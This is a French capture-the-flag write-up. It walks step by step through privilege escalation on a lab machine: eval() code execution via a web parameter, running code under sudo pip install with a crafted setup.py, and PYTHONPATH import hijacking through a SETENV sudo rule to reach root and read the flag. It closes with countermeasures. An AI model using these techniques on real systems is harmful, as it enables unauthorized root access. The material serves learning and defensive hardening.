# Élévation de privilèges

## 1 / Énumération des privilèges de `senku`

Après avoir récupéré le flag utilisateur, on poursuit l'énumération de la machine afin de trouver un moyen d'obtenir davantage de privilèges.

On commence par vérifier les privilèges `sudo` de l'utilisateur courant :

```python
__import__("os").popen("sudo -n -l 2>&1").read()
```

On obtient :

```text
Matching Defaults entries for senku on earth:
    env_reset, mail_badpass, secure_path=..., use_pty

User senku may run the following commands on earth:

    (cave-of-miracles) NOPASSWD: /usr/bin/pip3 install *
```

Cette règle indique que `senku` peut exécuter :

```text
/usr/bin/pip3 install *
```

en tant que l'utilisateur :

```text
cave-of-miracles
```

sans avoir besoin de fournir de mot de passe.

---

## 2 / Passage de `senku` à `cave-of-miracles`

La commande `pip install` est intéressante car l'installation d'un package Python peut entraîner l'exécution de code présent dans le package.

On crée donc un package Python contrôlé par nous dans `/tmp`.

Le package contient notamment un fichier :

```text
/tmp/pkg/setup.py
```

Lors de l'installation, le code présent dans `setup.py` est exécuté.

On lance ensuite l'installation avec :

```bash
sudo -n -u cave-of-miracles /usr/bin/pip3 install \
    --force-reinstall \
    --break-system-packages \
    /tmp/pkg
```

L'option `--break-system-packages` est nécessaire car Python applique la protection PEP 668 sur cette machine.

Pour vérifier l'utilisateur avec lequel le code est exécuté, on utilise :

```python
import os
open("/tmp/pip_whoami", "w").write(os.popen("id").read())
```

Le fichier contient :

```text
uid=1001(cave-of-miracles) gid=1001(cave-of-miracles) groups=1001(cave-of-miracles)
```

On a donc réussi à passer de :

```text
senku
  ↓
cave-of-miracles
```

## 3 / Nouvelle énumération avec `cave-of-miracles`

Après avoir changé d'utilisateur, il est important de recommencer l'énumération des privilèges.

On vérifie donc à nouveau les règles `sudo` :

```bash
sudo -l
```

On découvre une nouvelle règle :

```text
User cave-of-miracles may run the following commands on earth:

    (root) SETENV: NOPASSWD: /usr/bin/python3 /opt/backup.py
```

Cette règle permet à `cave-of-miracles` d'exécuter :

```text
/usr/bin/python3 /opt/backup.py
```

en tant que `root`.

L'option `SETENV` est particulièrement intéressante car elle permet de contrôler l'environnement de la commande.

---

## 4 / Analyse de `/opt/backup.py`

On commence par lire le script :

```python
open("/opt/backup.py").read()
```

Le début du script contient :

```python
from datetime import datetime
from pathlib import Path
import zipfile
```

Le script utilise donc le module Python :

```text
zipfile
```

Il est également configuré pour effectuer une sauvegarde du répertoire :

```python
OBJECT_TO_BACKUP = '/home/true-secret'
```

Le point intéressant est l'import :

```python
import zipfile
```

Python doit rechercher ce module lorsqu'il exécute le script.

---

## 5 / Utilisation de `PYTHONPATH`

La présence de `SETENV` dans la règle `sudo` permet de contrôler la variable d'environnement :

```text
PYTHONPATH
```

Cette variable indique à Python les répertoires dans lesquels rechercher les modules à importer.

On crée donc un répertoire :

```text
/tmp/pwn
```

et un fichier :

```text
/tmp/pwn/zipfile.py
```

L'objectif est de faire charger notre propre fichier lorsque `/opt/backup.py` effectue :

```python
import zipfile
```

Notre fichier contient du code exécuté dès son import.

On peut par exemple y placer :

```python
open("/tmp/root_id", "w").write(os.popen("id").read())
```

ainsi qu'une implémentation minimale des éléments utilisés par `backup.py` :

```python
class ZipFile:
    def __init__(self, *args, **kwargs):
        pass

    def write(self, *args, **kwargs):
        pass

    def close(self):
        pass

ZIP_DEFLATED = 0
```

## 6 / Exécution du module avec les privilèges root

Le `setup.py` du package déclenche ensuite :

```bash
sudo -n PYTHONPATH=/tmp/pwn /usr/bin/python3 /opt/backup.py
```

Grâce à la règle `sudo` découverte précédemment, `/opt/backup.py` est exécuté en tant que `root`.

Lors de l'instruction :

```python
import zipfile
```

Python charge notre fichier :

```text
/tmp/pwn/zipfile.py
```

Le code présent dans ce fichier est donc exécuté avec les privilèges `root`.

On vérifie le résultat en lisant :

```text
/tmp/root_id
```

On obtient :

```text
uid=0(root) gid=0(root) groups=0(root)
```

L'escalade vers `root` est donc réussie.

---

## 7 / Recherche du flag root

Maintenant que nous avons une exécution de code avec les privilèges `root`, nous pouvons énumérer le contenu du répertoire `/root`.

On utilise notre module Python pour exécuter :

```python
open("/tmp/root_ls", "w").write(str(os.listdir("/root")))
```

Le résultat est :

```text
['.bashrc', '.profile', 'root.txt', '.cache', 'scripts']
```

On identifie alors le fichier :

```text
/root/root.txt
```

comme étant le flag root.

---

## 8 / Récupération du flag root

On modifie notre module `zipfile.py` afin de lire le fichier :

```python
open("/tmp/root_flag", "w").write(
    open("/root/root.txt").read()
)
```

Le contenu du flag est ainsi copié dans :

```text
/tmp/root_flag
```

Ce fichier étant accessible depuis l'utilisateur `senku`, on peut finalement récupérer son contenu depuis le paramètre `calc` :

```python
open("/tmp/root_flag").read()
```

Le serveur affiche alors le contenu de `root.txt`.

## 9 / Contre-mesures

### Autorisation sudo sur `pip install`

- Ne jamais autoriser `pip install` avec `sudo` sur un chemin contrôlable par l'utilisateur.
- Installer les dépendances lors du déploiement depuis un verrou de dépendances vérifié, dans un environnement virtuel possédé par le service.
- Limiter toute commande sudo à un wrapper fixe, avec des chemins et arguments contrôlés.

### `SETENV` et détournement de `PYTHONPATH`

- Retirer `SETENV` lorsque l'environnement peut influencer un programme privilégié.
- Nettoyer l'environnement et utiliser des chemins d'import maîtrisés.
- Vérifier les permissions de chaque répertoire d'import et empêcher les modules système d'être masqués par `/tmp`.

# 9 / Chaîne d'exploitation

Le chemin complet de l'exploitation est donc :

```text
Port 5739
    │
    ▼
Application Flask
    │
    ▼
Paramètre calc
    │
    ▼
eval()
    │
    ▼
RCE Python
    │
    ▼
senku
    │
    │ sudo pip install
    ▼
cave-of-miracles
    │
    │ sudo python3 /opt/backup.py
    │ SETENV
    │ PYTHONPATH
    ▼
root
    │
    ▼
/root/root.txt
```

# 10 / Vulnérabilités exploitées

Plusieurs mauvaises configurations permettent cette chaîne d'escalade :

### RCE via `eval()`

L'application exécute directement une donnée contrôlée par l'utilisateur :

```python
eval(calc)
```

Cela permet d'obtenir une exécution de code Python à distance.

### `sudo pip install`

La règle :

```text
senku ALL=(cave-of-miracles) NOPASSWD: /usr/bin/pip3 install *
```

permet à `senku` de faire exécuter du code lors de la construction d'un package Python.

### `sudo SETENV`

La règle :

```text
cave-of-miracles ALL=(root) SETENV: NOPASSWD: /usr/bin/python3 /opt/backup.py
```

permet d'exécuter le script en tant que `root` tout en contrôlant certaines variables d'environnement.

### Détournement d'import Python

Le contrôle de `PYTHONPATH` permet de faire charger un module Python contrôlé par l'utilisateur à la place du module attendu :

```python
import zipfile
```

On obtient finalement une exécution de code avec les privilèges `root`.
